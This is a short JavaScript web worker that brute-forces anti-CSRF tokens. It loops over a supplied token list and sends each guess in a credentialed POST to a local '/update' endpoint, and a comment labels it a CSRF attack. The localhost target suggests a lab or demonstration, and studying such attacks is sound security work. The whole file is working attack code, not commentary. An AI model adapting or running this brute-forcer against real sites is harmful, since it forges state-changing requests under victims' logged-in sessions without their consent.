// Core of the web worker
self.addEventListener('message', function(e) {

	var tokens = e.data.tokens;

	function bruteLoop(TList) {
		for (var i = 0; i < TList.length; i++) {
			console.info("Testing: " + TList[i]);
			XHRPost(TList[i]);
		}
		
		Terminator();
	}

	function XHRPost(tVal) {
		var http = new XMLHttpRequest();
		// transaction URL to trigger CSRF attack
		var url = "https://127.0.0.1:5000/update";
		
		var token = tVal;
		// POST parameters
		params = {
			"city" : "NYCFromBruter",
			"csrf" : token
		};
    
     
		http.open("POST", url, true);
		http.withCredentials = 'true';
		//Send the proper header information along with the request
		http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		http.onreadystatechange = function() {
			if (http.readyState > 1) {//We don't care about responses
				//console.warn("Aborted " + token + " with status " + http.readyState);
				//http.abort();
			}
		}

         //Serialize the data without using JQuery 
		queryParams = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));return a},[]).join('&');
		http.send(queryParams);
	}

	function Terminator() {
		self.postMessage( "finished");
		self.close();
		return;
	}
	
	// Brute Loop
	bruteLoop(tokens);


}, false); 
